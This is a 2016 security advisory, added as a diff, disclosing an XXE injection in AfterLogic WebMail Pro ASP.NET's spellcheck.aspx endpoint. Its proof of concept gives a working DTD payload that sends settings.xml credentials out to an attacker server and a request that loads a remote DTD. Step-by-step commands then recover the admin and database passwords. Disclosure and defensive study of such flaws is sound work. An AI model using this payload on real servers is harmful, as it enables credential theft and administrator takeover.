@@ -1,0 +1,123 @@
+1. ADVISORY INFORMATION
+========================================
+Title: AfterLogic WebMail Pro ASP.NET Administrator Account Takover via XXE
+Injection
+Application: AfterLogic WebMail Pro ASP.NET
+Class: Sensitive Information disclosure
+Remotely Exploitable: Yes
+Versions Affected: AfterLogic WebMail Pro ASP.NET < 6.2.7
+Vendor URL: http://www.afterlogic.com/webmail-client-asp-net
+Bugs:  XXE Injection
+Date of found:  28.03.2016
+Reported:  22.05.2016
+Vendor response: 22.05.2016
+Date of Public Advisory: 23.05.2016
+Author: Mehmet Ince
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test
+by Mehmet INCE & Halit Alptekin from PRODAFT / INVICTUS
+
+
+3. VERSIONS AFFECTED
+========================================
+AfterLogic WebMail Pro ASP.NET < 6.2.7
+
+
+4. INTRODUCTION
+========================================
+It seems that /webmail/spellcheck.aspx?xml= endpoint takes XML request as
+an parameter and parse it with XML entities.
+By abusing XML entities attackers can read Web.config file as well as
+settings.xml that contains administrator account
+credentials in plain-text.
+
+5. TECHNICAL DETAILS & POC
+========================================
+
+1 - Put following XML entity definition into your attacker server. E.g:
+/var/www/html/test.dtd. Do NOT forget to change ATTACKER_SERVER_IP.
+
+<!ENTITY % payl SYSTEM
+"file://c:/inetpub/wwwroot/apps/webmail/app_data/settings/settings.xml">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM '
+http://ATTACKER_SERVER_IP/?p=%payl;'>">
+
+2 - Start reading access log on your attacker server.
+
+tail -f /var/log/apache/access.log
+
+3 - Send following HTTP GET request to the target.
+
+http://TARGET_DOMAIN/webmail/spellcheck.aspx?xml=<?xml version="1.0"
+encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://81.17.25.9/test.dtd">
+%remote;
+%int;
+%trick;]>
+
+4 - You will see the settings.xml content in your access log.
+5 - In order to decode and see it in pretty format. Please follow
+instruction in order.
+5.1 - Create urldecode alias by executing following command.
+
+alias urldecode='python -c "import sys, urllib as ul; \
+    print ul.unquote_plus(sys.argv[1])"'
+
+5.2 - Get last line of access log and pass it to the urldecode.
+
+root@hacker:/var/www/html# urldecode $(tail -n 1
+/var/log/apache2/access.log|awk {'print $7'})
+/?p=
+<Settings>
+  <Common>
+    <SiteName>[SITE_NAME_WILL_BE_HERE]</SiteName>
+    <LicenseKey>[LICENSE_KEY]/LicenseKey>
+    <AdminLogin>[ADMINISTRATOR_USERNAME]</AdminLogin>
+    <AdminPassword>[ADMINISTRATOR_PASSWORD]</AdminPassword>
+    <DBType>MSSQL</DBType>
+    <DBLogin>WebMailUser</DBLogin>
+    <DBPassword>[DATABASE_PASSWORD]</DBPassword>
+    <DBName>Webmail</DBName>
+    <DBDSN>
+    </DBDSN>
+    <DBHost>localhost\SQLEXPRESS</DBHost>
+    ....
+    ....
+    ...
+
+6 - You can login by using these administration credentials.
+Login panel is located at http://TARGET_DOMAIN/webmail/adminpanel/
+
+
+6. RISK
+========================================
+The vulnerability allows remote attackers to read sensitive information
+from the server such as settings.xml or web.config which contains
+administrator
+account and database credentials.
+
+7. SOLUTION
+========================================
+Update to the latest version v1.4.2
+
+8. REPORT TIMELINE
+========================================
+28.03.2016: Vulnerability discovered during pentest
+29.03.2016: Our client requested a time to mitigate their infrastructures
+22.05.2016: First contact with vendor
+22.05.2016: Vendor requested more technical details.
+23.05.2016: Vendor publishes update with 6.2.7 release.
+23.05.2016: Advisory released
+
+9. REFERENCES
+========================================
+https://twitter.com/afterlogic/status/734764320165400576
+
+
+-- 
+Sr. Information Security Engineer
+https://www.mehmetince.net
